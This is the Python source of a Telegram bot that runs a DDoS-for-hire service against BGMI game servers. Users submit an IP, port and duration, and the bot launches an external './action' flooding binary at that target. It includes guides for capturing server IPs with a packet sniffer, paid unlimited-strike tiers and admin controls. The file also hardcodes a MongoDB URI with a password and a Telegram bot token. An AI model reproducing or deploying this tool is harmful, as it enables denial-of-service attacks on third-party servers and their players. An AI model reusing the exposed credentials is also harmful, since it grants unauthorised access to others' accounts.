import os
import re
import subprocess
import telebot
from threading import Timer
import time
import ipaddress
import logging
import random
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from datetime import datetime, timedelta
import pytz
import requests
from collections import defaultdict
from pymongo import MongoClient
import asyncio
import threading

MONGO_URI = "mongodb+srv://lm6000k:IBRSupreme@ibrdata.uo83r.mongodb.net/"
client = MongoClient(MONGO_URI)
db = client['action']
actions_collection = db['action']

logging.basicConfig(filename='bot_actions.log', level=logging.INFO, format='%(asctime)s - %(message)s')

TOKEN = "7267969157:AAFBW9fqZYa1kMnAB9CerIxWQnJ0-6c7Wns"
if not TOKEN:
    raise ValueError("Please set your bot token in the environment variables!")
bot = telebot.TeleBot(TOKEN)

kolkata_tz = pytz.timezone('Asia/Kolkata')
HISTORY_CLEAR_INTERVAL = 3600
RATE_LIMIT = 5  # 5 DDoS strikes/day for non-premium in groups
AUTHORIZATION_FILE = 'authorizations.txt'
authorized_users = {}
AUTHORIZED_USERS = [6800732852, 5113311276]
BLOCKED_PORTS = [8700, 20000, 443, 17500, 9031, 20002, 20001]
pattern = re.compile(r"(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)\s(\d{1,5})\s(\d+)")
processes = defaultdict(dict)
user_modes = {}
supporter_users = {}
start_time = datetime.now(pytz.utc)
active_users = {}

def authorize_user(user_id, expire_time):
    expire_time_utc = expire_time.astimezone(pytz.utc)
    actions_collection.update_one(
        {'user_id': user_id},
        {'$set': {'status': 'authorized', 'expire_time': expire_time_utc}},
        upsert=True
    )

def clear_user_history_automatically():
    now = datetime.now(kolkata_tz)
    logging.info(f"Running automatic history clear at {now.strftime('%Y-%m-%d %H:%M:%S')}")
    unique_users = actions_collection.distinct("user_id")
    for user_id in unique_users:
        user_actions = actions_collection.find({"user_id": user_id}).sort("timestamp", -1).limit(5)
        action_ids = [action["_id"] for action in user_actions]
        if action_ids:
            result = actions_collection.delete_many({"_id": {"$in": action_ids}})
            if result.deleted_count > 0:
                logging.info(f"Auto-cleared {result.deleted_count} history entries for user {user_id}")
    Timer(HISTORY_CLEAR_INTERVAL, clear_user_history_automatically).start()

def save_authorizations():
    for user_id, info in authorized_users.items():
        expire_time_kolkata = info['expire_time'].astimezone(kolkata_tz)
        expire_time_utc = expire_time_kolkata.astimezone(pytz.utc)
        actions_collection.update_one(
            {'user_id': user_id},
            {'$set': {'status': info['status'], 'expire_time': expire_time_utc}},
            upsert=True
        )

def load_authorizations():
    global authorized_users
    authorized_users = {}
    users = actions_collection.find({"status": "authorized"})
    for user in users:
        user_id = str(user['user_id'])
        expire_time_str = user.get('expire_time')
        if not expire_time_str or not isinstance(expire_time_str, str):
            logging.error(f"Invalid expire_time for user {user_id}")
            continue
        try:
            from dateutil import parser
            expire_time_utc = parser.isoparse(expire_time_str).astimezone(pytz.utc)
            expire_time_kolkata = expire_time_utc.astimezone(kolkata_tz)
            user['expire_time'] = expire_time_kolkata
        except (ValueError, TypeError) as e:
            logging.error(f"Failed to parse expire_time for user {user_id}: {e}")
            continue
        authorized_users[user_id] = user
    logging.info(f"Loaded {len(authorized_users)} authorized users with expiration times.")

def broadcast_message_to_all(message):
    all_users = actions_collection.find({}, {"user_id": 1})
    for user in all_users:
        try:
            bot.send_message(user['user_id'], message)
        except Exception as e:
            logging.error(f"Failed to send message to user {user['user_id']}: {str(e)}")

def is_authorized(user_id):
    user_info = actions_collection.find_one({'user_id': user_id})
    if user_info and user_info['status'] == 'authorized':
        now = datetime.now(kolkata_tz)
        expire_time = user_info['expire_time'].astimezone(kolkata_tz)
        if now < expire_time:
            return True
        actions_collection.update_one(
            {'user_id': user_id},
            {'$set': {'status': 'expired'}}
        )
    return False

def notify_admins(user_id, username):
    message = f"🎮 *New BGMI Warlord Request!* 🎮\n\n👤 *Player:* @{username} (ID: `{user_id}`)\n💣 *Mission:* Approve or frag this wannabe!"
    for admin_id in AUTHORIZED_USERS:
        bot.send_message(admin_id, message, parse_mode='Markdown')

def is_valid_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def is_valid_port(port):
    return 1 <= int(port) <= 65535

def is_valid_duration(duration):
    return int(duration) > 0 and int(duration) <= 600

def check_expired_users():
    now_kolkata = datetime.now(kolkata_tz)
    now_utc = now_kolkata.astimezone(pytz.utc)
    expired_users = actions_collection.find({
        'status': 'authorized',
        'expire_time': {'$lte': now_utc}
    })
    for user in expired_users:
        user_id = user['user_id']
        bot.send_message(user_id, "⏰ *Airdrop Expired!* Your warlord pass is down—hit up an admin to reload! 💥", parse_mode='Markdown')
        actions_collection.update_one(
            {'user_id': user_id},
            {'$set': {'status': 'expired'}}
        )
    Timer(900, check_expired_users).start()

def check_rate_limit(user_id, chat_type):
    if user_id in AUTHORIZED_USERS or chat_type == 'private':
        return True  # Admins and private = unlimited frags
    if is_authorized(user_id):
        return True  # Authorized = Warlord = No limits
    now = datetime.now(kolkata_tz)
    today = now.replace(hour=0, minute=0, second=0, microsecond=0).astimezone(pytz.utc)
    user_usage = actions_collection.find_one(
        {"user_id": user_id, "type": "rate_limit", "date": {"$gte": today}}
    )
    if not user_usage:
        actions_collection.insert_one({
            "user_id": user_id,
            "type": "rate_limit",
            "date": today,
            "action_count": 0
        })
        return True
    action_count = user_usage.get("action_count", 0)
    if action_count >= RATE_LIMIT:
        return False
    return True

def increment_rate_limit(user_id, chat_type):
    if chat_type == 'private' or user_id in AUTHORIZED_USERS or is_authorized(user_id):
        return  # No limits for warlords
    now = datetime.now(kolkata_tz)
    today = now.replace(hour=0, minute=0, second=0, microsecond=0).astimezone(pytz.utc)
    actions_collection.update_one(
        {"user_id": user_id, "type": "rate_limit", "date": today},
        {"$inc": {"action_count": 1}},
        upsert=True
    )

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    markup.add(KeyboardButton('Manual Mode'), KeyboardButton('Auto Mode'))
    welcome_text = (
        "🎮 *Yo, BGMI Warrior! Welcome to the DDoS Drop Zone!* 🎮\n\n"
        "🔥 *Gear up!* I’m your squad leader for smashing servers in BGMI!\n\n"
        "💣 *Battle Plan:*\n"
        "1️⃣ *Manual Mode:* You snipe—IP, port, duration, BOOM!\n"
        "2️⃣ *Auto Mode:* Drop IP and port, I’ll frag with a random timer!\n\n"
        "✋ *Chicken Dinner Brake:* `stop all` to pull out!\n\n"
        "🔒 *Squad Rules:* Private needs `/auth`. Groups? 5 strikes/day unless you’re a warlord!\n\n"
        "📡 *Intel:* `/help` for the full loot drop!\n\n"
        "*Built by Ibr, the BGMI Beast!*"
    )
    bot.reply_to(message, welcome_text, parse_mode='Markdown', reply_markup=markup)

@bot.message_handler(commands=['help'])
def send_help(message):
    help_text = (
        "📡 *BGMI DDoS Bootcamp* 📡\n\n"
        "💥 *Snipe IPs & Ports with HTTP Canary for BGMI Domination!* 💥\n\n"
        "🎯 *Warzone Intel:* 🎯\n"
        "1️⃣ *Gear Up:* Grab *HTTP Canary* from Play Store—your scope! 📲\n"
        "2️⃣ *Lock On:* Hit *Start* (▶️) to scan the battlefield! 🌐\n"
        "3️⃣ *Drop In:* Launch BGMI, hit the lobby, wait for the timer! 🎮\n"
        "4️⃣ *Spot Enemies:* Flip to Canary, lock onto *UDP* packets! 📡\n"
        "5️⃣ *Target Locked:* Find ports *10,000-30,000* (e.g., `12345`). IP like `203.0.113.5`—grab it! ✂️\n"
        "6️⃣ *Strike Hard:*\n"
        "   - *Manual:* `<IP> <Port> <Duration>` (e.g., `203.0.113.5 14567 60`)\n"
        "   - *Auto:* `<IP> <Port>` (e.g., `203.0.113.5 14567`)\n\n"
        "🔫 *Hot Drops:*\n"
        "   - Manual: `203.0.113.5 14567 60`\n"
        "   - Auto: `203.0.113.5 14567`\n\n"
        "⚠️ *No-Fly Zones:*\n"
        "   - Blocked ports: `8700, 20000, 443, 17500, 9031, 20002, 20001`—dodge ‘em! 🚫\n"
        "   - Private? `/auth` for warlord status. Groups? 5/day unless elite!\n\n"
        "💪 *Need Backup?* I’ve got your six—just holler!\n\n"
        "*Forged by Ibr, the BGMI War Machine!*"
    )
    bot.reply_to(message, help_text, parse_mode='Markdown')

@bot.message_handler(commands=['ping'])
def ping_bot(message):
    now = datetime.now(pytz.utc)
    uptime = str(now - start_time).split('.')[0]
    bot.reply_to(message, f"🎯 *Ping!* Locked and loaded!\n⏰ *Uptime:* `{uptime}`—still in the zone!", parse_mode='Markdown')

@bot.message_handler(commands=['stats'])
def show_stats(message):
    user_id = message.from_user.id
    if user_id not in AUTHORIZED_USERS:
        bot.reply_to(message, "🚫 *Squad Leaders Only!* Warlords get the intel!", parse_mode='Markdown')
        return
    now = datetime.now(pytz.utc)
    today = now.replace(hour=0, minute=0, second=0, microsecond=0)
    total_actions = actions_collection.count_documents({"timestamp": {"$gte": today}})
    active_count = len(processes)
    authorized_count = actions_collection.count_documents({"status": "authorized"})
    stats = (
        f"📊 *BGMI Warzone Report* 📊\n\n"
        f"⏰ *Sitrep:* `{now.astimezone(kolkata_tz).strftime('%Y-%m-%d %H:%M:%S')}`\n"
        f"👑 *Warlords:* `{authorized_count}`\n"
        f"💥 *Live Strikes:* `{active_count}`\n"
        f"🔫 *Today’s Kills:* `{total_actions}`\n\n"
        "*Command the battleground!*"
    )
    bot.reply_to(message, stats, parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text in ['Manual Mode', 'Auto Mode'])
def set_mode(message):
    user_id = message.from_user.id
    selected_mode = message.text.lower().split()[0]
    user_modes[user_id] = selected_mode
    bot.reply_to(message, f"🎮 *Switched to {selected_mode.capitalize()} Mode!* Time to frag! 💣", parse_mode='Markdown')

@bot.message_handler(commands=['list_active'])
def list_active_users(message):
    user_id = message.from_user.id
    if user_id not in AUTHORIZED_USERS:
        bot.reply_to(message, "🚫 *Warlord Access Only!* No intel for grunts!", parse_mode='Markdown')
        return
    if not active_users:
        bot.reply_to(message, "🌌 *Dead Zone!* No squads in action!", parse_mode='Markdown')
        return
    active_list = "🔥 *Active BGMI Warriors:* 🔥\n\n"
    for uid, info in active_users.items():
        action = info.get("action", "Stealth Strike")
        active_list += f"👤 *Player:* {info['username']} (ID: `{uid}`)\n💣 *Move:* `{action}`\n\n"
    bot.reply_to(message, active_list, parse_mode='Markdown')

@bot.message_handler(commands=['approve'])
def approve_user(message):
    if message.chat.type != 'private' or message.from_user.id not in AUTHORIZED_USERS:
        bot.reply_to(message, "🚫 *Warlord Command Only!* Elite squad approves!", parse_mode='Markdown')
        return
    try:
        _, user_id, duration = message.text.split()
        user_id = int(user_id)
        now = datetime.now(kolkata_tz)
        expire_time = None
        time_match = re.match(r"(\d+)([dhm])", duration)
        if time_match:
            value, unit = time_match.groups()
            value = int(value)
            if unit == 'h':
                expire_time = now + timedelta(hours=value)
            elif unit == 'd':
                expire_time = now + timedelta(days=value)
            elif unit == 'm':
                expire_time = now + timedelta(days=30 * value)
        elif duration == 'permanent':
            expire_time = now + timedelta(days=365*100)
        if expire_time:
            authorize_user(user_id, expire_time)
            bot.reply_to(message, f"🎉 *{user_id} joins the Warlords for {duration}!* Locked and loaded! 💪", parse_mode='Markdown')
            bot.send_message(user_id, "👑 *You’re a BGMI Warlord!* Unlimited strikes—drop ‘em all! 🔥", parse_mode='Markdown')
            logging.info(f"Admin {message.from_user.id} approved user {user_id} for {duration}")
        else:
            bot.reply_to(message, "❌ *Timer Glitch!* Use `Xd`, `Xh`, `Xm`, or `permanent`!", parse_mode='Markdown')
    except ValueError:
        bot.reply_to(message, "❌ *Command Fumble!* Drop `/approve <user_id> <duration>`!", parse_mode='Markdown')

@bot.message_handler(commands=['reject'])
def reject_user(message):
    if message.chat.type != 'private' or message.from_user.id not in AUTHORIZED_USERS:
        bot.reply_to(message, "🚫 *Warlord Veto Only!* No squad for you!", parse_mode='Markdown')
        return
    try:
        _, user_id = message.text.split()
        user_id = int(user_id)
        if user_id in authorized_users and authorized_users[user_id]['status'] == 'pending':
            authorized_users[user_id]['status'] = 'rejected'
            save_authorizations()
            bot.reply_to(message, f"💥 *{user_id} fragged!* No warlord status!", parse_mode='Markdown')
            logging.info(f"Admin {message.from_user.id} rejected user {user_id}'s application.")
            bot.send_message(user_id, "😡 *Warlord Denied!* Admin dropped you—GG no re!", parse_mode='Markdown')
        else:
            bot.reply_to(message, f"⚠️ *{user_id} ain’t queued!* No request to frag!", parse_mode='Markdown')
    except ValueError:
        bot.reply_to(message, "❌ *Target Missed!* Use `/reject <user_id>`—aim better!", parse_mode='Markdown')

@bot.message_handler(commands=['remove'])
def remove_user(message):
    if message.chat.type != 'private' or message.from_user.id not in AUTHORIZED_USERS:
        bot.reply_to(message, "🚫 *Warlord Kick Only!* Elite boots only!", parse_mode='Markdown')
        return
    try:
        _, user_id = message.text.split()
        user_id = int(user_id)
        if str(user_id) in authorized_users:
            actions_collection.delete_one({'user_id': user_id})
            del authorized_users[str(user_id)]
            bot.reply_to(message, f"✅ *{user_id} kicked from Warlords!* Out of the squad!", parse_mode='Markdown')
            logging.info(f"Admin {message.from_user.id} removed user {user_id}.")
            bot.send_message(user_id, "💥 *Warlord Status Revoked!* Admin sniped you!", parse_mode='Markdown')
        else:
            bot.reply_to(message, f"⚠️ *{user_id} ain’t elite!* No one to drop!", parse_mode='Markdown')
    except ValueError:
        bot.reply_to(message, "❌ *Kick Fail!* Use `/remove <user_id>`—lock on!", parse_mode='Markdown')

@bot.message_handler(commands=['auth'])
def request_authorization(message):
    user_id = message.from_user.id
    username = message.from_user.username if message.from_user.username else 'Unknown'
    if user_id in AUTHORIZED_USERS:
        bot.reply_to(message, "👑 *You’re already a BGMI God!* No queue for legends!", parse_mode='Markdown')
        return
    user_info = actions_collection.find_one({'user_id': user_id})
    if user_info and user_info['status'] == 'authorized':
        expire_time_utc = user_info['expire_time']
        expire_time_kolkata = expire_time_utc.astimezone(kolkata_tz)
        expire_time_str = expire_time_kolkata.strftime("%Y-%m-%d %H:%M:%S")
        bot.reply_to(message, (
            f"🔥 *You’re a BGMI Warlord!* 🔥\n\n"
            f"⏰ *War Pass Expires:* `{expire_time_str}` (Asia/Kolkata)\n"
            "Keep owning the battleground!"
        ), parse_mode='Markdown')
        return
    bot.reply_to(message, (
        f"🎮 *Warlord Request Dropped!* Stay frosty!\n\n"
        f"👤 *ID:* `{user_id}`\n"
        f"👑 *Tag:* @{username}\n\n"
        "Admins are scoping—warlord status incoming! 💣"
    ), parse_mode='Markdown')
    notify_admins(user_id, username)
    logging.info(f"User {user_id} ({username}) requested authorization")

@bot.message_handler(commands=['yell'])
def handle_yell(message):
    if message.from_user.id not in AUTHORIZED_USERS:
        bot.reply_to(message, "🚫 *Warlord Mic Only!* Grunts don’t shout!", parse_mode="Markdown")
        return
    broadcast_message = message.text.replace("/yell", "").strip()
    if not broadcast_message:
        bot.reply_to(message, "❌ *Mic Jam!* Drop some war cries first!", parse_mode="Markdown")
        return
    keyboard = InlineKeyboardMarkup()
    confirm_button = InlineKeyboardButton("📢 Drop the Bomb!", callback_data=f"confirm_broadcast_{message.chat.id}")
    keyboard.add(confirm_button)
    bot.reply_to(message, f"🎤 *Squad Alert Preview:*\n\n`{broadcast_message}`\n\nReady to hype the battleground?", reply_markup=keyboard, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("confirm_broadcast_"))
def confirm_broadcast(call):
    chat_id = int(call.data.split("_")[-1])
    broadcast_message = call.message.text.replace("🎤 *Squad Alert Preview:*\n\n", "").replace("\n\nReady to hype the battleground?", "")
    all_users = actions_collection.find({}, {"user_id": 1})
    for user in all_users:
        try:
            bot.send_message(user['user_id'], broadcast_message)
        except:
            pass
    bot.send_message(chat_id, "🎉 *Squad Hyped!* War cries echo across BGMI!", parse_mode="Markdown")

@bot.message_handler(commands=['history'])
def show_history(message):
    user_id = message.from_user.id
    if message.chat.type == 'private' and user_id not in AUTHORIZED_USERS and not is_authorized(user_id):
        bot.reply_to(message, "🚫 *Warlord Pass Needed!* Drop `/auth` to unlock!", parse_mode='Markdown')
        return
    history = actions_collection.find({"user_id": user_id}).sort("timestamp", -1).limit(5)
    response = "📜 *Your BGMI Kill Log!* 📜\n\n"
    for action in history:
        ts = action['timestamp'].astimezone(kolkata_tz).strftime("%Y-%m-%d %H:%M:%S")
        response += f"🌍 *IP:* `{action['ip']}` | 🔌 *Port:* `{action['port']}` | ⏳ `{action['duration']}s` | *Mode:* `{action['mode']}` | ⏰ `{ts}`\n"
    bot.reply_to(message, response if history else "🌌 *No Kills Yet!* Time to frag!", parse_mode='Markdown')

def get_thread_value(user_id):
    user_settings = actions_collection.find_one({'user_id': user_id})
    if user_settings and 'thread_value' in user_settings:
        return user_settings['thread_value']
    return random.choice([200, 200, 210])

def set_thread_value(user_id, value):
    actions_collection.update_one(
        {'user_id': user_id},
        {'$set': {'thread_value': value}},
        upsert=True
    )

@bot.message_handler(commands=['setthread'])
def handle_setthread(message):
    user_id = message.from_user.id
    if message.chat.type == 'private' and user_id not in AUTHORIZED_USERS and not is_authorized(user_id):
        bot.reply_to(message, "🚫 *Warlord Access Only!* Get elite with `/auth`!", parse_mode='Markdown')
        return
    try:
        command, value = message.text.split()
        value = int(value)
        set_thread_value(user_id, value)
        bot.reply_to(message, f"🎮 *Thread Locked at {value}!* Your weapon’s primed! 💥", parse_mode='Markdown')
    except ValueError:
        current_value = get_thread_value(user_id)
        bot.reply_to(
            message,
            f"🔫 *Current Thread Load:* `{current_value}`\n\n"
            "🎮 *Reload:* `/setthread <value>`—lock and load!",
            parse_mode='Markdown'
        )
    except Exception as e:
        current_value = get_thread_value(user_id)
        bot.reply_to(
            message,
            f"🔫 *Current Thread Load:* `{current_value}`\n\n"
            "🎮 *Reload:* `/setthread <value>`—drop in!",
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    user_id = message.from_user.id
    chat_type = message.chat.type
    if chat_type == 'private' and user_id not in AUTHORIZED_USERS and not is_authorized(user_id):
        bot.reply_to(message, "🚫 *Warlord Squad Only!* Drop `/auth` to join the fray! 🔥\n\n*Built by Ibr, the BGMI Beast!*", parse_mode='Markdown')
        return
    text = message.text.strip().lower()
    user_mode = user_modes.get(user_id, 'manual')
    if text == 'stop all':
        stop_all_actions(message)
        return
    if chat_type != 'private' and not check_rate_limit(user_id, chat_type):
        bot.reply_to(message, (
            f"⛔ *Ammo Depleted!* You’ve fired {RATE_LIMIT} strikes today in this group!\n\n"
            "🎯 *Go Warlord:* `/auth` in private for unlimited frags!"
        ), parse_mode='Markdown')
        return
    auto_mode_pattern = re.compile(r"(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)\s(\d{1,5})")
    manual_mode_pattern = re.compile(r"(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)\s(\d{1,5})\s(\d{1,4})")
    if user_mode == 'auto':
        match = auto_mode_pattern.match(text)
        if match:
            ip, port = match.groups()
            duration = random.randint(80, 240)
            if not is_valid_ip(ip):
                bot.reply_to(message, "❌ *IP Miss!* That’s not a target—scope again!\n\n*By Ibr, the BGMI Beast!*", parse_mode='Markdown')
                return
            if not is_valid_port(port):
                bot.reply_to(message, "❌ *Port Off-Target!* Aim 1-65535!\n\n*By Ibr, the BGMI Beast!*", parse_mode='Markdown')
                return
            if int(port) in BLOCKED_PORTS:
                bot.reply_to(message, f"⛔ *Port {port} is a Dead Zone!* Switch targets!\n\n*By Ibr, the BGMI Beast!*", parse_mode='Markdown')
                return
            markup = ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
            markup.add(KeyboardButton('Stop Action'))
            asyncio.run(run_action(user_id, message, ip, port, duration, user_mode, chat_type))
        else:
            bot.reply_to(message, "⚠️ *Drop Fail!* Aim like `<ip> <port>`—lock on!\n\n*By Ibr, the BGMI Beast!*", parse_mode='Markdown')
    elif user_mode == 'manual':
        match = manual_mode_pattern.match(text)
        if match:
            ip, port, duration = match.groups()
            if not is_valid_ip(ip):
                bot.reply_to(message, "❌ *IP Whiff!* No lock—give me a real target!\n\n*By Ibr, the BGMI Beast!*", parse_mode='Markdown')
                return
            if not is_valid_port(port):
                bot.reply_to(message, "❌ *Port Misfire!* Scope 1-65535!\n\n*By Ibr, the BGMI Beast!*", parse_mode='Markdown')
                return
            if not is_valid_duration(duration):
                bot.reply_to(message, "❌ *Timer Jam!* Set 1-600s—reload!\n\n*By Ibr, the BGMI Beast!*", parse_mode='Markdown')
                return
            if int(port) in BLOCKED_PORTS:
                bot.reply_to(message, f"⛔ *Port {port} Blocked!* Pick a live zone!\n\n*By Ibr, the BGMI Beast!*", parse_mode='Markdown')
                return
            markup = ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
            markup.add(KeyboardButton('Stop Action'))
            asyncio.run(run_action(user_id, message, ip, port, duration, user_mode, chat_type))
        else:
            bot.reply_to(message, (
                "⚠️ *Aim Off!* Lock it in:\n"
                "`<ip> <port> <duration>`\n\n"
                "*Ex:* `192.168.1.100 8080 60`—60s of chaos!\n\n"
                "*By Ibr, the BGMI Beast!*"
            ), parse_mode='Markdown')

async def run_action(user_id, message, ip, port, duration, user_mode, chat_type):
    try:
        thread_value = get_thread_value(user_id)
        duration = int(duration)
        sent_message = bot.send_message(
            message.chat.id,
            f"💥 *{user_mode.capitalize()} Mode Strike Incoming!* 💥\n\n"
            f"🌍 *Target IP:* `{ip}`\n"
            f"🔌 *Port:* `{port}`\n"
            f"⏳ *Fuse:* `{duration}s`\n"
            f"🔫 *Firepower:* `{thread_value}`\n\n"
            "🎮 *Dropping the DDoS bomb—brace yourself!*",
            parse_mode="Markdown"
        )
        process = await asyncio.create_subprocess_exec(
            "./action", ip, port, str(duration), str(thread_value),
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        processes[user_id] = {'process': process}
        totalduration = int(duration)
        while process.returncode is None:
            await asyncio.sleep(5)
            duration -= 5
            if duration > 0:
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=sent_message.message_id,
                    text=(
                        f"🔥 *Strike LIVE!* `{duration}s` to detonation!\n\n"
                        f"🌍 *IP:* `{ip}`\n"
                        f"🔌 *Port:* `{port}`\n"
                        f"🔫 *Firepower:* `{thread_value}`\n\n"
                        "💣 *BGMI chaos in progress—hold the line!*"
                    ),
                    parse_mode="Markdown"
                )
            else:
                break
        stdout, stderr = await process.communicate()
        increment_rate_limit(user_id, chat_type)
        actions_collection.insert_one({
            "user_id": user_id,
            "ip": ip,
            "port": int(port),
            "duration": totalduration,
            "mode": user_mode,
            "timestamp": datetime.now(pytz.utc)
        })
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=sent_message.message_id,
            text=(
                f"🏆 *Chicken Dinner Secured!* 🏆\n\n"
                f"🌍 *IP:* `{ip}`\n"
                f"🔌 *Port:* `{port}`\n"
                f"⏱ *Strike Time:* `{totalduration}s`\n"
                f"🔫 *Firepower:* `{thread_value}`\n\n"
                "🎮 *Server smoked—next target, warrior?*"
            ),
            parse_mode="Markdown"
        )
    except ValueError as e:
        logging.error(f"❌ Invalid duration value for user {user_id}: {str(e)}")
        bot.reply_to(message, f"⚠️ *Fuse Fumble!* Drop a real timer, soldier!", parse_mode="Markdown")
    except Exception as e:
        logging.error(f"❌ Error running action for user {user_id}: {str(e)}")
        bot.reply_to(message, f"💥 *Strike Crashed!* Chaos broke: `{str(e)}`—reload!", parse_mode="Markdown")

def stop_all_actions(message):
    user_id = message.from_user.id
    if user_id in processes:
        process_info = processes[user_id]
        process = process_info['process']
        if process.returncode is None:
            process.terminate()
            del processes[user_id]
            bot.reply_to(message, "🛑 *Strike Aborted!* Squad’s safe!", parse_mode='Markdown')
        else:
            bot.reply_to(message, "⚠️ *No Strikes to Abort!* Zone’s clear!", parse_mode='Markdown')
    else:
        bot.reply_to(message, "⚠️ *No Strikes to Abort!* Nothing’s live!", parse_mode='Markdown')

@bot.message_handler(commands=['usage'])
def show_usage(message):
    user_id = message.from_user.id
    chat_type = message.chat.type
    if chat_type == 'private' and user_id not in AUTHORIZED_USERS and not is_authorized(user_id):
        bot.reply_to(message, "🚫 *Warlord Pass Required!* Drop `/auth` to squad up!", parse_mode='Markdown')
        return
    if chat_type == 'private' or user_id in AUTHORIZED_USERS or is_authorized(user_id):
        bot.reply_to(message, "🔥 *Unlimited BGMI Chaos!* Warlords like you don’t reload! 💪", parse_mode='Markdown')
        return
    now = datetime.now(kolkata_tz)
    today = now.replace(hour=0, minute=0, second=0, microsecond=0).astimezone(pytz.utc)
    user_usage = actions_collection.find_one(
        {"user_id": user_id, "type": "rate_limit", "date": {"$gte": today}}
    )
    action_count = user_usage.get("action_count", 0) if user_usage else 0
    remaining = RATE_LIMIT - action_count
    bot.reply_to(message, (
        f"📊 *Group Strike Report!* 📊\n\n"
        f"🔫 *Fired:* `{action_count}/{RATE_LIMIT}`\n"
        f"💣 *Ammo Left:* `{remaining if remaining > 0 else 0}`\n\n"
        f"⏰ *Reloads:* Midnight (Asia/Kolkata)\n"
        "🎯 *Go Warlord:* `/auth` in private for endless frags!"
    ), parse_mode='Markdown')

if __name__ == '__main__':
    logging.info("Starting the bot...")
    load_authorizations()
    check_expired_users()
    clear_user_history_automatically()
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"Error occurred: {str(e)}")
